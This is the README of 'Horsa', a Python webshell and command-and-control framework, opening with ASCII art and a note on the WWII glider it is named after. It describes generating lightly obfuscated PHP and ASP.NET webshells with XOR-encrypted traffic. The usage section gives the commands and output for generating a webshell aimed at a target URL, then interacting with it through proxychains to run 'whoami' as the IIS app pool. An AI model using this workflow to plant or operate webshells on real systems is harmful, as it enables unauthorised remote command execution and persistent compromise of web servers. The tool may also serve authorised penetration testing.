
```
-@@@@@@@@@@@%@@@@%#*+==---=-------=--=====================-==========--==-==--====================-=
-@%@@@@@@@@@@@%%%%===-----------+-----:::::::::----++------:::--:::::-+*++=+=*+-==:::::::::::::::::=
-@@@@@@@@@@@@%@@@@@@@+------=-:-::::::::::::::::-+=--:-:----:-:::-::::=##******=+::::::::::::::::::-
=@@@@%@@@@@%%@@@@@@@@@@@:::::-::::::::::::::::::--=-:-:-:-=--:::-+---::+#*#*#*##+::::::::::::::::::-
-**#%@@@@%%#*=@@@@@@@@@@@@--===--------:::::::::::::::::---::::::=::::::-+*#%%%==*:::::::::::::::::-
=*+++%@%@+***++@@@@@@@@@@@@@+++===-------::::::::::::::::::::::::::::-::+*#%%%%#=-:::::::::-:::::::=
-*++***+==+**#*++@@@@@@@@@@@@@%+===------::::::::::::::::::::::::::::---:*+##%**++:::::-=:-:-:::-::-
=###***+++*##*+***#@@@@@@@@@@@@@@==--------::::::::::::::::::::::::::::+=*###%%%%%*+-:=--::-=::::::-
=%%%%%%######***###*@@@@@@@@%@@@@@@--------:::::::::::::::::::::::::::::=****+*#**+*+===-::-:-----=-
=@@%#%%%%%%####***+**+@@@@@@@@@@@@@@@=----:::::::::::::::::::::::::::::-+*+=+++++++++===---:-::-----
=%%%%##%#%#####*******+@@@@@@@@@@@@@@@@%-::::::::::::::::::::::::::::::-+++===*+=+*++**+=--:::::::--
=%%###*###***##**++++++==@@@@@@@@@%@@@@@@@:::::::::::::::::::::::::::::::---+==-----=---::::::::::--
=####*********+++++=======-@@@@@@@@@@@@@@@@@::::::::::::::::::::::::::::::-::+-====-=::::::---:::::-
=####*******++++=========---@@@@@@@@@@@@@@@@@@=:::::::::::::::::::::::::::::::::--+--:---:::---::::-
=#####*****++===---=---------:@@@@@@@@@@@@@@@@@@=:::::::::::::::::::::::::::::::::::--::---:--::-::-
=#########**+=+=---=----:::::::@@@@@@@@@@@@@@@@@@@:::::::::::::::::-:=*::::::::::::::::::-==-::::::-
=##########*++*+++++=---:--::--:@@@@@@@@@@@@@@@@@@@=-::::::::#@@@@@@@@@@@:::::::::::::-:---::::::::-
=*##+#%####@@@@@@*###*=+++=-------@@@@@@@@@@@@@@@@@@@=@@@@@@@@@@@@@@@@@@@@::::::::::-:-------::::::-
=*##########%@@@@@@+**+@%++=--:::::-@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@:::::::::===+==-:::-::::-
=#**##########*@@@@@@@@@@+=-::::::::-#@@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@:::::::::::--**++*+-:::::::-
=*****######*##**@@@@@@%@---::::*@@@@@@@@@@@%%%%%%%%%%%@@@@@@@@@@++@::::::::::::::::-+*####*=--::::-
=****#####********+@@@@@@#%@@@@@##@@#@@@@@@@@%%%%%%@@@@@@@@:::::::#:::::::::-::::----++**##*+---:::-
=++***#******+=---@@@@@@@@@@@@##%##%%@@@@@@@@@@@@@@@@@@@@@@@:::::::::::::::-=:-:==----=-=*#***---::-
==+********+++--:@@@@@@@%%%@@@@@@%%%%%@#:::::@@@@@@@@@@@@@@@@:::::::::::::::----+++------=+****+===-
==++******+++---:-::-:::::@@@@@@:::::::::::::::@@@@@@@@@@@@@@*::::::::::::::::=+++-==----:-=++**+==-
==+++*++++==+=--------------:==-::::::::::::::::#@@@@@@@@@@@@@::::::--:::::-::---=--===----:-==+++=-
=-=++=+**+++=-=-=------------::::::::::::::::::::::@@%@@@@@@@@@:::::::::::::::::------=+=-::::--==--
=-==+++++++==========-=----::::-:::::::::::::----:::::#@@@@@%@@@:--:::::::::::::::---------::::::::-
=-===++++++=++++=======--=--------::::::::::--=-::::::::+%@@%%@@#:::--:::::::::::::::------::::::::-
=---====++++++++++=--=====--=------:::::::::::--:::::::::::%@@@@@:::---:::::::-:::::::-----::-:::::-
=-----===++++++*++++=====--=-==----:::::-:::--:::::-:::::::::::::::::::---:::::::::::-------:::::::-
=---------=+++++++++++=====--------------:::::::::::::::::::::::::::::::::::--:--:------:---:::::::-
=-----------================--=--=------:-:::::::::::::::::::::::::::::::::----------::::::-:::::::-
=--------:-------------==-==------==--::::::::::::::::::::::::::::::::::::::::-:------:::::::::::::-
=-------:::::-----------------------=---:::::::::::::::::::::::::::::::::::::::::----:-:::::::---::-
=---------::::::::------------------------:::::::::::::::::::::::::::::::::::::::::-::::::::-::-----
=----------:::::::------:--:--:---::---------::::::::::::::::::::::::::::::::::::::::::::::::::-----
=:------:-------:::-:::::::::::-::::::-------::::::::::::::::::::::::::::::::::::::::::::::::::::::-
=::-------------:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::-:--:--
==============================================--=-=----------------:::::::::::::::::::::::::-:-:-=--
```
![Python](https://img.shields.io/badge/python-3.11-blue.svg)
![Version](https://img.shields.io/badge/release-1.0-yellow.svg)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](https://opensource.org/licenses/MIT)

The Airspeed Horsa was a British military glider used during World War II. It was designed by the British manufacturer Airspeed Limited in response to a requirement from the British military for a large transport glider that could carry troops in support of airborne operations.

Despite being a large and cumbersome aircraft, was well-liked by the troops who used it, especially during the Normandy landings in June 1944, where it played a crucial role.

## [+] Overview

Horsa is a **webshell framework and command-control (C2)** made in Python. The project is built around two core functions. Alternatively, the Python's wrapper can generate webshells in ASP.NET or PHP on fly or interact with agents deployed on targets.

The content of the HTTP(S) communications between the wraper and a deployed webshell is #XOR encrypted and base64-encoded. 

>[!WARNING]
>Note the user-agent (UA) and the XOR key can be configured through the custom command-line interface (CLI). 

The Horsa webshell's have **working but limited capabilities**, such as:
- **command execution** through dangerous native functions (PHP) or cmd.exe built-in binary (ASPX)
- **file upload**
- *few PHP functions and download capabilities may be added in the future (maybe not)*

The PHP template used to generate new agent is **lightly obfuscated**. The ASP.NET may soon benefit from a similar treatment.

The whole project is **object oriented** and structured as follow:
- `main.py`: Python's wrapper entry point
- `core/session.py`: this class is related to the core functionalities of Horsa (generate, interact)
- `core/handler.py`: the handler class builds commands that can be interpreted by Horsa's agents
- `core/request.py`: this class handles the communication between the wrapper and the agents
- `core/config.py`: contains parameters configurable to customize the project
- `output/`: generated webshells are written here
- `implant/`: webshell templates can be found here (ASP.NET and PHP)

## [+] Recommended setup

After`git clone` the project, you should a create a clean Python's virtual environment and install the requirements using `pip` tool:
```bash
cd horsa
python -m virtualenv horsa-venv
source horsa-venv/bin/activate/
pip3 install -r requirements
```
## [+] Usage

The Python wrapper is user-friendly. To generate an ASP.NET or a PHP webshell, use the following command:

```shell
# proxychains -q rlwrap python3 main.py --generate --key mypassword --lang aspx --url http://10.0.4.195/test.aspx

██   ██  ██████  ██████  ███████  █████  
██   ██ ██    ██ ██   ██ ██      ██   ██ 
███████ ██    ██ ██████  ███████ ███████ 
██   ██ ██    ██ ██   ██      ██ ██   ██ 
██   ██  ██████  ██   ██ ███████ ██   ██ 
+ php/aspx webshell command & control +

[*] Initializing Horsa
[*] Generating an Horsa webshell
+ filename: test.aspx
+ language: aspx
+ auth-key: mypassword
[+] Horsa webshell in aspx available at output/test.aspx
[+] You may deploy this webshell then run Horsa on --interact mode
[+] Exiting now!
```

Remember, you can get help to use the CLI by typing the following command in a shell:

```bash
python3 main.py --help
```

To interact with a deployed agents, use the following commands:

```bash
# proxychains -q rlwrap python3 main.py --interact --key mypassword --lang aspx --url http://10.0.4.195/test.aspx

██   ██  ██████  ██████  ███████  █████  
██   ██ ██    ██ ██   ██ ██      ██   ██ 
███████ ██    ██ ██████  ███████ ███████ 
██   ██ ██    ██ ██   ██      ██ ██   ██ 
██   ██  ██████  ██   ██ ███████ ██   ██ 
+ php/aspx webshell command & control +

[*] Initializing Horsa
[+] Horsa webshell found on target
[*] Use :help to list built-in commands
+ target: http://10.0.4.195/test.aspx
+ user-agent: hora-ws
+ language: aspx
+ auth-key: mypassword
DefaultAppPool@TESTAPP1: C:/inetpub/wwwroot/]$ :shell whoami
iis apppool\defaultapppool
```

## [+] Credits
A special thanks goes to :
- **[weevely3](https://github.com/epinna/weevely3)** is the mother-of-all the webshell framework projects. You know what I mean, and if you not, just try this piece of masterwork.
- **[SharPyShell](https://github.com/antonioCoco/SharPyShell)** was vital to better understand how to use ASP.NET to get a working .aspx agent. His project is far more achieved than I could ever imagined regarding Horsa. Kudo to @antonioCoco
